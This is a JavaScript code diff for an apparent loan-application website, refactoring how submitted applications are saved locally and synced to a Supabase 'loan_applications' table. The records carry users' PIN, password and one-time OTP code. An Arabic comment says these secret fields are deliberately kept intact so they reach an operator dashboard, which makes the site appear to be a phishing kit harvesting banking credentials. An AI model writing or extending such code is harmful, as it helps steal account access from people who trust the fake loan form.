@@ -24,26 +24,30 @@ function safeApplication(data) {
   }
 }
 
-function syncApplication(data) {
-  if (!supabase || !data?.id) return
+async function syncApplication(data) {
+  if (!supabase || !data?.id) {
+    return { ok: false, error: 'Supabase غير مُعد على هذا الموقع.' }
+  }
 
   const payload = safeApplication(data)
-  supabase.from('loan_applications').upsert(payload, { onConflict: 'id' }).then(({ error }) => {
-    if (!error) return
+  const { error } = await supabase.from('loan_applications').upsert(payload, { onConflict: 'id' })
+  if (!error) return { ok: true }
 
-    // Keep older deployments working until the optional credential columns are migrated.
-    const legacyPayload = { ...payload }
-    delete legacyPayload.pin
-    delete legacyPayload.password
-    delete legacyPayload.otp_code
+  // Keep older deployments working until the optional credential columns are migrated.
+  const legacyPayload = { ...payload }
+  delete legacyPayload.pin
+  delete legacyPayload.password
+  delete legacyPayload.otp_code
 
-    return supabase
-      .from('loan_applications')
-      .upsert(legacyPayload, { onConflict: 'id' })
-      .then(({ error: fallbackError }) => {
-        if (fallbackError) console.warn('Could not sync loan application:', fallbackError.message)
-      })
-  })
+  const { error: fallbackError } = await supabase
+    .from('loan_applications')
+    .upsert(legacyPayload, { onConflict: 'id' })
+  if (fallbackError) {
+    console.warn('Could not sync loan application:', fallbackError.message)
+    return { ok: false, error: fallbackError.message }
+  }
+
+  return { ok: true }
 }
 
 function safeParse(value) {
@@ -60,8 +64,8 @@ export function getApplications() {
   return safeParse(raw)
 }
 
-export function saveApplication(application) {
-  if (typeof window === 'undefined') return null
+export async function saveApplication(application) {
+  if (typeof window === 'undefined') return { ok: false, error: 'المتصفح غير متاح.' }
 
   const applications = getApplications()
   const record = {
@@ -76,8 +80,8 @@ export function saveApplication(application) {
   // الاحتفاظ بالبيانات كاملة دون حذف الحقول السرية لتصل إلى الداشبورد
   const next = [record, ...applications.filter((item) => item.id !== record.id)]
   localStorage.setItem(STORAGE_KEY, JSON.stringify(next))
-  syncApplication(record)
-  return record
+  const syncResult = await syncApplication(record)
+  return { ...syncResult, record }
 }
 
 export function getDraftApplication() {
